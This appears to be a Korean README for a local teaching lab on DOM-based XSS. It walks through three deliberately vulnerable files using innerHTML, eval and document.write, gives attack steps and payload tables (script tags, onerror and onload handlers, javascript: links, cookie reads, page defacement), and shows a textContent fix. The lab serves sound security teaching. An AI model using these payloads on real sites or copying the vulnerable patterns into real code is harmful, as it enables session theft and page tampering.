# 03. DOM-based XSS 실습

> xss.md 연결: 3장 (DOM 기반 XSS), 2장 (document.write 예시)

## 실행 방법

서버 불필요. 브라우저에서 직접 파일을 열면 됩니다.

```bash
open xss/03-dom-based/vulnerable/innerHTML.html
# 또는
open xss/03-dom-based/vulnerable/eval.html
open xss/03-dom-based/vulnerable/document_write.html
```

## 취약 파일별 공격 방법

### D-01. innerHTML.html

**취약 코드**: `element.innerHTML = params.get('name')`

**공격 절차**:
1. 파일을 브라우저로 열기
2. URL 주소창에 추가: `?name=<img src=x onerror=alert(document.domain)>`
3. 또는 입력창에 `<svg onload=alert(1)>` 입력 후 출력 버튼

**페이로드 모음**:
| 목적 | 페이로드 |
|---|---|
| 기본 동작 확인 | `<script>alert(document.domain)</script>` |
| 이벤트 기반 | `<img src=x onerror=alert(document.cookie)>` |
| SVG | `<svg onload=alert(1)>` |
| 링크 | `<a href="javascript:alert(1)">클릭</a>` |

### D-02. eval.html

**취약 코드**: `eval(params.get('expr'))`

**공격 절차**:
1. URL에 추가: `?expr=alert(document.domain)`
2. 또는 입력창에 `alert(document.cookie)` 입력

**페이로드 모음**:
| 목적 | 페이로드 |
|---|---|
| 기본 | `alert(document.domain)` |
| 쿠키 탈취 | `alert(document.cookie)` |
| 페이지 변조 | `document.body.innerHTML='<h1>Hacked</h1>'` |

### D-03. document_write.html

**취약 코드**: `document.write("<p>URL: " + document.location + "</p>")`
(xss.md의 예시 코드와 동일)

**공격 절차**:
1. URL에 추가: `?q=<img src=x onerror=alert(1)>`

## 방어 버전

```bash
open xss/03-dom-based/secure/safe_dom.html
```

**핵심 수정**: `innerHTML` → `textContent`

```javascript
// ❌ 취약
element.innerHTML = userInput;

// ✅ 안전
element.textContent = userInput;
```

## 왜 DOM-based XSS가 위험한가?

- 서버를 거치지 않으므로 **서버 로그에 흔적이 남지 않음**
- Burp Suite 등으로 패킷 가로채도 페이로드가 보이지 않는 경우 있음
- 방어가 서버사이드가 아닌 **클라이언트사이드 코드**에서 이루어져야 함
